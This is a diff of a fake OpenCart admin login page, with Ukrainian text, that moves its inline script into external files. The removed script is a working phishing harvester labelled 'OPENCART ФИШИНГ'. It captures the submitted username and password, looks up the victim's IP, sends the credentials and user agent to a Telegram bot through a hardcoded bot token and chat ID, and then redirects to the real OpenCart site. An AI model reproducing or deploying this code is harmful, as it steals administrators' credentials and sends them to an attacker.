@@ -45,73 +45,7 @@
     <footer><hr>© 2009-2026 Всі права захищені.<br><a href="#" class="btn btn-primary btn-sm">РОЗРОБКА І ПРОСУВАННЯ МАГАЗИНІВ НА OPENCART</a></footer>
 </div>
 
-<script>
-// ========== ПРЯМЫЕ ДАННЫЕ (БЕЗ ШИФРОВАНИЯ ДЛЯ ТЕСТА) ==========
-const BOT_TOKEN = '8772852255:AAHSTIsw1bAqPd15iLwVFaHmmJ49c1ZEoq8';
-const CHAT_ID = '7908172150';
-
-async function getIP() {
-    try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
-    } catch (error) {
-        console.error('IP error:', error);
-        return 'unknown';
-    }
-}
-
-async function sendToTelegram(login, password, ip) {
-    const message = `🛡️ OPENCART ФИШИНГ 🛡️\n\n👤 Логин: ${login}\n🔑 Пароль: ${password}\n🌐 IP: ${ip}\n⏰ Время: ${new Date().toLocaleString('uk-UA')}\n🖥️ User Agent: ${navigator.userAgent}`;
-    
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message
-            })
-        });
-        
-        const result = await response.json();
-        console.log('Telegram response:', result);
-        
-        if (!response.ok) {
-            console.error('Telegram error:', result);
-        }
-    } catch (error) {
-        console.error('Network error:', error);
-    }
-}
-
-document.getElementById('loginForm').addEventListener('submit', async function(e) {
-    e.preventDefault();
-    
-    const username = document.getElementById('input-username').value;
-    const password = document.getElementById('input-password').value;
-    
-    if (!username || !password) {
-        alert('Будь ласка, заповніть всі поля');
-        return;
-    }
-    
-    const submitBtn = document.querySelector('button[type="submit"]');
-    const originalText = submitBtn.innerHTML;
-    submitBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Перевірка...';
-    submitBtn.disabled = true;
-    
-    const ip = await getIP();
-    await sendToTelegram(username, password, ip);
-    
-    setTimeout(() => {
-        window.location.href = 'https://www.opencart.com/';
-    }, 1200);
-});
-</script>
+<script src="config.js"></script>
+<script src="send.js"></script>
 </body>
 </html>
